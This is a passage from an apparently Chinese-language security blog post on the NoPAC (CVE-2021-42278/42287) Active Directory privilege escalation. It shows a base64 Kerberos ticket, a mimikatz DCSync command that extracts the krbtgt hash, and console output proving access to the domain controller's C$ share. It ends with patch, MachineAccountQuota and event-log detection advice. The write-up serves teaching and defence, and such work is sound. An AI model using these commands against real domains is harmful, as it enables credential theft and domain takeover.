/ticket:doIEhjCCBIKgAwIBBaEDAgEWooIDrTCCA6lhggOlMIIDoaADAgEFoQobCFJPT1QuQ09Noh0wG6ADAgECoRQwEhsGa3JidGd0Gwhyb290LmNvbaOCA20wggNpoAMCARKhAwIBAqKCA1sEggNXwkFLGDE/w3NXJ2k3szGRZzNGZKCuZZtHQuHv5o8UG31pH9Zv5yFQnGreyosgtqwhRKlckXDU8cW+JI9nqLc3D4BF0iFCLu94tObL3HH6ylcC0iDyhNSmQJSQhj1AopkUOsnuu2e1hG2kh2rD83+N389qGRCIniwmEC3hV4DUJ6Ljlfee11VOkJnZTApoFMcVhygqYpm+W2rYNiz/Z0dwGjwCP/5R/HdJyKotBbuK6grxdm54Tt2sjaUZ6quiHV1ea9p+n4R0ZkkNsYtyxALHTIrGQPJelXVaJPxadUNgZ2rwCbhJ9GoHlMht66l0zQ50haukVFoULoSM4qjN1+qxm/lafTz6ktQgJAnHTjvnbg2x5Len5VXj5K0OYs45DoBu/D70BTrlrjAgiraR88IHsrc5hb/DFegtygIt86Jujx/JLduF02+Z0n9DRQ/uEnxg+PZhBX80vDGBWIa1Ns4/AdiO8DsgcNRUzZqtbY9to95yJYocz/MWTE3q8U3TohPDiiQunGLZptqVbOmRQRphTVw5AY6pd2OzusFt7itCejDOZFMegMAt9Yedrd0Qfm+/aTlJdhI7t1BSE1S+sIk6Qi6mrqykSNM0uQL7Y0ol8PMKVWuaIYS5y+W/IxebUI3hmXuX26uobz5POOF4Ma93ajxdwARpX6n42Tyjn6igpK89NT4onmdMTBRuk5nxojS6Ol5Tg76ZPfUlq5KcqRW+SJ85FvZTpbs3q6ueW1fi31VyFqW+HlmU5XGhM4HOPKXFmv+lxmpeOcmtwQD7tir9CTTKX95GFfwSoLp2Kq7K6bCCTYLS4eXnTQG4vlB9nUihK2ymBOsbKfB23RJ1Jvb7l+TufJaUB+ZEHzFzdVjROtErJ1Seiw/oapF1+Sb9y7X+QfWxeVbj8cm8IUZzQWu6dV0mgvFoqCiOE55jpiegGqErGgvpyyTsCfeXE7DFoOqoKi1/CxOt4Xtu8I2AsP+SuHxT0sRIJGvH/IJOWTdfly3RYYbc6yJhDY+VTWH3nDK0KJ6XroLvCLvUxkNgmS2vWkdmAQdONUfWBn3ErpvA7nOgdW4l0xY902y+4RM7aMuUGFDD+BI2SXKjOZZZWW0oCgQZyuVa4kWKFjATqh++Gnj71A8gxiCPo4HEMIHBoAMCAQCigbkEgbZ9gbMwgbCgga0wgaowgaegGzAZoAMCARehEgQQTgbyErLI2WPYLwIbK6QyxKEKGwhST09ULkNPTaIPMA2gAwIBAaEGMAQbAkRDowcDBQBA4QAApREYDzIwMjUwODEwMTM0MzAyWqYRGA8yMDI1MDgxMDIzNDMwMlqnERgPMjAyNTA4MTcxMzQzMDJaqAobCFJPT1QuQ09NqR0wG6ADAgECoRQwEhsGa3JidGd0Gwhyb290LmNvbQ==</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/image%209adsasdfqge.png?imageSlim" alt="image.png"></p>
+<h2 id="6-用mimikatz来验证是否获得域管权限"><a href="#6-用mimikatz来验证是否获得域管权限" class="headerlink" title="6. 用mimikatz来验证是否获得域管权限"></a>6. 用mimikatz来验证是否获得域管权限</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;lsadump::dcsync /domain:root.com /user:krbtgt /csv&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/image%201dsada0.png?imageSlim" alt="image.png"></p>
+<p>成功获得域管的shell</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;klist</span><br><span class="line"></span><br><span class="line">当前登录 ID 是 <span class="number">0</span>:<span class="number">0x33fed4</span></span><br><span class="line"></span><br><span class="line">缓存的票证: (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">#<span class="number">0</span>&gt;     客户端: administrator @ ROOT.COM</span><br><span class="line">        服务器: ldap/DC.root.com @ ROOT.COM</span><br><span class="line">        Kerberos 票证加密类型: AES-<span class="number">256</span>-CTS-HMAC-SHA1-<span class="number">96</span></span><br><span class="line">        票证标志 <span class="number">0xa50000</span> -&gt; renewable pre_authent ok_as_delegate name_canonicalize</span><br><span class="line">        开始时间: <span class="number">8</span>/<span class="number">10</span>/<span class="number">2025</span> <span class="number">21</span>:<span class="number">52</span>:<span class="number">04</span> (本地)</span><br><span class="line">        结束时间:   <span class="number">8</span>/<span class="number">11</span>/<span class="number">2025</span> <span class="number">7</span>:<span class="number">43</span>:<span class="number">02</span> (本地)</span><br><span class="line">        续订时间: <span class="number">8</span>/<span class="number">17</span>/<span class="number">2025</span> <span class="number">21</span>:<span class="number">43</span>:<span class="number">02</span> (本地)</span><br><span class="line">        会话密钥类型: AES-<span class="number">256</span>-CTS-HMAC-SHA1-<span class="number">96</span></span><br><span class="line">        缓存标志: <span class="number">0</span></span><br><span class="line">        调用的 KDC:</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;dir \\dc.root.com\c$</span><br><span class="line">用户名或密码不正确。</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;net use \\dc.root.com\c$ /user:administrator</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;dir \\dc.root.com\c$</span><br><span class="line"> 驱动器 \\dc.root.com\c$ 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 5AE3-4F94</span><br><span class="line"></span><br><span class="line"> \\dc.root.com\c$ 的目录</span><br><span class="line"></span><br><span class="line"><span class="number">2016</span>/<span class="number">07</span>/<span class="number">16</span>  <span class="number">21</span>:<span class="number">23</span>    &lt;DIR&gt;          PerfLogs</span><br><span class="line"><span class="number">2024</span>/<span class="number">10</span>/<span class="number">03</span>  <span class="number">17</span>:<span class="number">15</span>    &lt;DIR&gt;          Program Files</span><br><span class="line"><span class="number">2016</span>/<span class="number">07</span>/<span class="number">16</span>  <span class="number">21</span>:<span class="number">23</span>    &lt;DIR&gt;          Program <span class="title function_">Files</span> <span class="params">(x86)</span></span><br><span class="line"><span class="number">2024</span>/<span class="number">11</span>/<span class="number">16</span>  <span class="number">14</span>:<span class="number">44</span>               <span class="number">629</span> result.txt</span><br><span class="line"><span class="number">2024</span>/<span class="number">11</span>/<span class="number">07</span>  09:<span class="number">53</span>            <span class="number">17</span>,<span class="number">222</span> secpol.cfg</span><br><span class="line"><span class="number">2024</span>/<span class="number">11</span>/<span class="number">07</span>  <span class="number">10</span>:<span class="number">31</span>    &lt;DIR&gt;          Users</span><br><span class="line"><span class="number">2024</span>/<span class="number">11</span>/<span class="number">16</span>  <span class="number">16</span>:<span class="number">17</span>    &lt;DIR&gt;          Windows</span><br><span class="line">               <span class="number">2</span> 个文件         <span class="number">17</span>,<span class="number">851</span> 字节</span><br><span class="line">               <span class="number">5</span> 个目录 <span class="number">30</span>,096,<span class="number">715</span>,<span class="number">776</span> 可用字节</span><br><span class="line">               </span><br><span class="line">C:\Windows\system32&gt;dir \\dc.root.com\c$\Users</span><br><span class="line"> 驱动器 \\dc.root.com\c$ 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 5AE3-4F94</span><br><span class="line"></span><br><span class="line"> \\dc.root.com\c$\Users 的目录</span><br><span class="line"></span><br><span class="line"><span class="number">2024</span>/<span class="number">11</span>/<span class="number">07</span>  <span class="number">10</span>:<span class="number">31</span>    &lt;DIR&gt;          .</span><br><span class="line"><span class="number">2024</span>/<span class="number">11</span>/<span class="number">07</span>  <span class="number">10</span>:<span class="number">31</span>    &lt;DIR&gt;          ..</span><br><span class="line"><span class="number">2025</span>/<span class="number">06</span>/<span class="number">28</span>  <span class="number">18</span>:<span class="number">18</span>    &lt;DIR&gt;          Administrator</span><br><span class="line"><span class="number">2024</span>/09/<span class="number">30</span>  <span class="number">23</span>:<span class="number">54</span>    &lt;DIR&gt;          Public</span><br><span class="line"><span class="number">2024</span>/<span class="number">11</span>/<span class="number">11</span>  <span class="number">23</span>:<span class="number">02</span>    &lt;DIR&gt;          weipaitest</span><br><span class="line">               <span class="number">0</span> 个文件              <span class="number">0</span> 字节</span><br><span class="line">               <span class="number">5</span> 个目录 <span class="number">30</span>,096,<span class="number">715</span>,<span class="number">776</span> 可用字节</span><br></pre></td></tr></table></figure>
+
+<h1 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h1><ol>
+<li>安装微软的补丁<code>KB5008602</code> 和 <code>KB5008380</code>；</li>
+<li>限制域内可创建机器账户的用户权限，修改<code>MachineAccountQuota</code>的属性值为0；【这其实是针对第一个CVE的防御】</li>
+<li>Tips：在域内创建一个机器账号，将其<code>samAccountName</code>改为DC的主机名，因为域内<code>sAMAccountName</code>是唯一的，不能重复，所以攻击者就无法创建与域控同名的主机名。</li>
+</ol>
+<h1 id="日志检测"><a href="#日志检测" class="headerlink" title="日志检测"></a>日志检测</h1><p>1、Name impersonation 可通过分析以下安全日志</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">【<span class="number">4741</span>事件】  创建机器账号</span><br><span class="line">【<span class="number">4742</span>事件】  删除SPN</span><br><span class="line">【<span class="number">4781</span>事件】  修改sAMAccountName</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>2、KDC bamboozling 可通过分析以下安全日志</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">【<span class="number">4768</span>事件：请求TGT】 <span class="title function_ invoke__">TargetUserName</span>(发起Kerberos身份验证请求的用户名)为域控主机名而不是主机名+$</span><br><span class="line">【<span class="number">4769</span>事件：请求ST】  TargetUserName不包含$(区分正常的机器账户请求)，并且<span class="title function_ invoke__">ServiceName</span>(请求服务的名称)为域控主机名并不是</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://starven-l.github.io">Starven</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://starven-l.github.io/2025/08/10/NoPAC%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E6%88%98%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5-By-Starven/">https://starven-l.github.io/2025/08/10/NoPAC%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E6%88%98%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5-By-Starven/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://starven-l.github.io" target="_blank">Starven's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a></div><div class="post-share"><div class="social-share" data-image="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/07/16/NTLM-Relay-Attack%E7%9A%84%E8%A1%A5%E4%B8%81%E5%8F%8A%E5%85%B6%E6%94%BB%E5%87%BB%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93-By-Starven/" title="NTLM Relay Attack的补丁及其攻击绕过总结-By.Starven"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">NTLM Relay Attack的补丁及其攻击绕过总结-By.Starven</div></div><div class="info-2"><div class="info-item-1">我们都知道获取Net NTLM hash之后的攻击向量存在hashcat爆破和NTLM relay这两个攻击手法 前者基本李用不了，而后者才是利用重点，但是呢各种协议的relay又历经修复补丁与新的绕过CVE 我始终觉得脑子里面装的学的有点乱，因此来写一篇文章总结一下，感觉还是挺不好完整梳 relay to SMB这个应该是最近最热门了的吧 我们知道最开始微软发布的补丁已经把这条路封死了，**CVE-2019-1384也过去了多年，**但是就上个月爆出的CVE-2025-33073可以对其进行绕过使得NTLM Relay再次成为热点话题 MS08-068【最早的中继攻击relay to SMB】：不多说 kb957097补丁【修复MS08-068也就是relay to smb】：增加了一些机制防止SMB客户端将NTLM认证请求转发到自身或其他SMB服务 12345671. 仅允许来自本地的 NTLM challenge-response，限制了SMB反射回自身（也就是说攻击者伪装的SMB服务返回的challenge-response会被拒绝接受）2. 验证SPN（防止凭据重播）防...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/06/20/CVE-2025-33073%E8%BF%91%E6%9C%9F%E7%83%AD%E9%97%A8%E6%BC%8F%E6%B4%9E%E6%B5%85%E8%B0%88-%E5%9F%9F%E5%86%85%E5%A4%A7%E6%9D%80%E5%99%A8-NTLMrelay%E5%86%8D%E6%B7%BB%E6%94%BB%E5%87%BB%E5%90%91%E9%87%8F/" title="CVE-2025-33073近期热门漏洞浅谈-域内大杀器-NTLMrelay再添攻击向量"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-20</div><div class="info-item-2">CVE-2025-33073近期热门漏洞浅谈-域内大杀器-NTLMrelay再添攻击向量</div></div><div class="info-2"><div class="info-item-1">漏洞背景在 MS08-068 修复后，我们知道微软采取了一些机制防止 SMB 客户端将 NTLM 身份验证请求回发到自己或其他 SMB 服务中（SMB → SMB） 1231.增加了 NTLM 中继限制2.引入 NTLM Message Signing3.使用 SPN 检查 验证请求目的地是否正确  而为什么说NTLM Relay复活呢就是这个原因，CVE-2025-33073是James Forshaw披露的，他发现可以通过绕过来实现relay SMB to SMB 漏洞介绍与危害微软这次爆的这个洞呢是NTLM 反射攻击，也是给NTLM Relay攻击再添加了一种攻击手段 简单一句话概述危害吧：攻击者只要拿到了普通域用户的凭据，就可以远程获取域内非域控主机的最高权限，从而实现快速的横向移动扩散危害整个企业内部网络 而一般除了域控默认开启SMB签名，其他域成员机基本不开启，所以说危害是极高的 这个洞爆出来一周由于最近考试繁多一直没来得及复现，还是得挤一下时间复现 漏洞利用条件 任意域用户的条件 目标机器未开启SMB签名  攻击路径与域环境情况1234567域：root.com域控...</div></div></div></a><a class="pagination-related" href="/2025/07/14/Exchange-%E6%94%BB%E5%87%BB%E4%B8%93%E9%A2%98/" title="Exchange 攻击专题"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-14</div><div class="info-item-2">Exchange 攻击专题</div></div><div class="info-2"><div class="info-item-1">仅是对原文的阅读理解cv浓缩 攻击向量 若没有任何凭据  12341.泄露信息  2.爆破邮箱账户  3.配合钓鱼进行中继  4.RCE   有普通凭据  12345671.导出邮箱列表2.搜索自身敏感邮件3.搜索共享文件4.搜索域信息5.攻击 Outlook 客户端6.配合 SSRF 进行中继7.RCE   有高权限凭据  121.全局邮件管理2.攻击域管  一、无任何权限的攻击向量1. 探测发现Exchange邮件服务 域内定位  1234567891011通过SPN：setspn -Q exchange*/*通过DNS：nslookup -type=srv _autodiscover._tcp通过LDAP查SPN：AdFind.exe -h 域控ip -b &quot;DC=example,DC=com&quot; -f &quot;|(ServicePrincipalName=exchange*)(ServicePrincipalName=smtp*)(ServicePrincipalName=imap*)(ServicePrincipalName=pop*)&quot;...</div></div></div></a><a class="pagination-related" href="/2025/07/16/NTLM-Relay-Attack%E7%9A%84%E8%A1%A5%E4%B8%81%E5%8F%8A%E5%85%B6%E6%94%BB%E5%87%BB%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93-By-Starven/" title="NTLM Relay Attack的补丁及其攻击绕过总结-By.Starven"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-16</div><div class="info-item-2">NTLM Relay Attack的补丁及其攻击绕过总结-By.Starven</div></div><div class="info-2"><div class="info-item-1">我们都知道获取Net NTLM hash之后的攻击向量存在hashcat爆破和NTLM relay这两个攻击手法 前者基本李用不了，而后者才是利用重点，但是呢各种协议的relay又历经修复补丁与新的绕过CVE 我始终觉得脑子里面装的学的有点乱，因此来写一篇文章总结一下，感觉还是挺不好完整梳 relay to SMB这个应该是最近最热门了的吧 我们知道最开始微软发布的补丁已经把这条路封死了，**CVE-2019-1384也过去了多年，**但是就上个月爆出的CVE-2025-33073可以对其进行绕过使得NTLM Relay再次成为热点话题 MS08-068【最早的中继攻击relay to SMB】：不多说 kb957097补丁【修复MS08-068也就是relay to smb】：增加了一些机制防止SMB客户端将NTLM认证请求转发到自身或其他SMB服务 12345671. 仅允许来自本地的 NTLM challenge-response，限制了SMB反射回自身（也就是说攻击者伪装的SMB服务返回的challenge-response会被拒绝接受）2. 验证SPN（防止凭据重播）防...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Starven</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Starven-L" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="tencent://message/?uin=1732293304&amp;Site=&amp;Menu=yes" target="_blank" title="QQ"><i class="fab fa-qq" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-number">1.</span> <span class="toc-text">Reference</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF"><span class="toc-number">2.</span> <span class="toc-text">漏洞背景</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-CVE-2021-42287%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">影响范围 CVE-2021-42287：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9A%E8%BF%98%E6%98%AF%E5%BE%AE%E8%BD%AF%E7%9A%84%E6%A3%80%E6%B5%8B%E6%9C%BA%E5%88%B6%E7%9A%84%E7%BC%BA%E9%99%B7%E5%92%8CKerberos%E5%AF%B9altSecurityIdentities%E5%B1%9E%E6%80%A7%E7%9A%84%E5%A4%84%E7%90%86%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7"><span class="toc-number">4.</span> <span class="toc-text">漏洞原理：还是微软的检测机制的缺陷和Kerberos对altSecurityIdentities属性的处理逻辑缺陷</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-42278"><span class="toc-number">4.1.</span> <span class="toc-text">CVE-2021-42278</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-42287"><span class="toc-number">4.2.</span> <span class="toc-text">CVE-2021-42287</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">5.</span> <span class="toc-text">漏洞利用条件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A0%B8%E5%BF%83%E7%82%B9"><span class="toc-number">6.</span> <span class="toc-text">漏洞核心点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%AE%A9KDC%E6%89%BE%E4%B8%8D%E5%88%B0UserName%EF%BC%9F"><span class="toc-number">6.1.</span> <span class="toc-text">如何让KDC找不到UserName？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%AE%A9KDC%E5%9C%A8TGS-REP%E9%87%8C%E9%9D%A2%E9%87%8D%E6%96%B0%E7%94%9F%E6%88%90PAC%E8%80%8C%E4%B8%8D%E6%98%AF%E6%8B%B7%E8%B4%9DTGT%E7%9A%84PAC%EF%BC%9F"><span class="toc-number">6.2.</span> <span class="toc-text">如何让KDC在TGS-REP里面重新生成PAC而不是拷贝TGT的PAC？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">7.</span> <span class="toc-text">漏洞复现与利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%96%B0%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%99%AE%E9%80%9A%E7%9A%84%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7"><span class="toc-number">7.1.</span> <span class="toc-text">1. 新建一个普通的机器账户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%B0%86%E6%9C%BA%E5%99%A8%E7%94%A8%E6%88%B7evil-machine%E7%9A%84saMAccountName%E5%B1%9E%E6%80%A7%E4%BF%AE%E6%94%B9%E4%B8%BA%E5%9F%9F%E6%8E%A7%E5%90%8DDC"><span class="toc-number">7.2.</span> <span class="toc-text">2. 将机器用户evil_machine的saMAccountName属性修改为域控名DC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%AF%B7%E6%B1%82%E5%B8%A6%E6%9C%89PAC%E7%9A%84%E6%AD%A3%E5%B8%B8%E7%9A%84TGT%E8%AE%A4%E8%B4%AD%E6%9D%83%E8%AF%81"><span class="toc-number">7.3.</span> <span class="toc-text">3. 请求带有PAC的正常的TGT认购权证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%8E%A5%E7%9D%80%E5%B0%86%E6%9C%BA%E5%99%A8%E7%94%A8%E6%88%B7evil-machine-%E7%9A%84saMAccountName%E5%B1%9E%E6%80%A7%E8%BF%98%E5%8E%9F"><span class="toc-number">7.4.</span> <span class="toc-text">4. 接着将机器用户evil_machine$的saMAccountName属性还原</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E7%94%A8%E5%B8%A6PAC%E7%9A%84%E6%AD%A3%E5%B8%B8%E7%9A%84TGT%E3%80%90%E5%88%A9%E7%94%A8S4u2Self%E5%8D%8F%E8%AE%AE%E3%80%91%E8%AF%B7%E6%B1%82%E8%AE%BF%E9%97%AEldap-DC-root-com%E7%9A%84ST%E6%9C%8D%E5%8A%A1%E7%A5%A8%E6%8D%AE%EF%BC%8C%E5%B9%B6%E4%B8%94%E5%B0%86%E7%A5%A8%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%86%85%E5%AD%98%E4%B8%AD"><span class="toc-number">7.5.</span> <span class="toc-text">5. 用带PAC的正常的TGT【利用S4u2Self协议】请求访问ldap&#x2F;DC.root.com的ST服务票据，并且将票据导入内存中</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E7%94%A8mimikatz%E6%9D%A5%E9%AA%8C%E8%AF%81%E6%98%AF%E5%90%A6%E8%8E%B7%E5%BE%97%E5%9F%9F%E7%AE%A1%E6%9D%83%E9%99%90"><span class="toc-number">7.6.</span> <span class="toc-text">6. 用mimikatz来验证是否获得域管权限</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1"><span class="toc-number">8.</span> <span class="toc-text">漏洞防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8B"><span class="toc-number">9.</span> <span class="toc-text">日志检测</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/10/NoPAC%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E6%88%98%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5-By-Starven/" title="NoPAC域内提权漏洞 - 原理分析与实战最佳实践 - By.Starven">NoPAC域内提权漏洞 - 原理分析与实战最佳实践 - By.Starven</a><time datetime="2025-08-10T14:40:06.000Z" title="发表于 2025-08-10 22:40:06">2025-08-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/16/NTLM-Relay-Attack%E7%9A%84%E8%A1%A5%E4%B8%81%E5%8F%8A%E5%85%B6%E6%94%BB%E5%87%BB%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93-By-Starven/" title="NTLM Relay Attack的补丁及其攻击绕过总结-By.Starven">NTLM Relay Attack的补丁及其攻击绕过总结-By.Starven</a><time datetime="2025-07-16T06:31:39.000Z" title="发表于 2025-07-16 14:31:39">2025-07-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/14/Exchange-%E6%94%BB%E5%87%BB%E4%B8%93%E9%A2%98/" title="Exchange 攻击专题">Exchange 攻击专题</a><time datetime="2025-07-14T15:39:37.000Z" title="发表于 2025-07-14 23:39:37">2025-07-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/14/MCP%E5%A4%A7%E6%A8%A1%E5%9E%8B%E4%B8%8A%E4%B8%8B%E6%96%87%E5%8D%8F%E8%AE%AE/" title="MCP大模型上下文协议">MCP大模型上下文协议</a><time datetime="2025-07-14T14:44:49.000Z" title="发表于 2025-07-14 22:44:49">2025-07-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/10/EKS-Cluster-Games-Summary/" title="EKS Cluster Games - Summary">EKS Cluster Games - Summary</a><time datetime="2025-07-10T03:37:11.000Z" title="发表于 2025-07-10 11:37:11">2025-07-10</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By Starven</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" 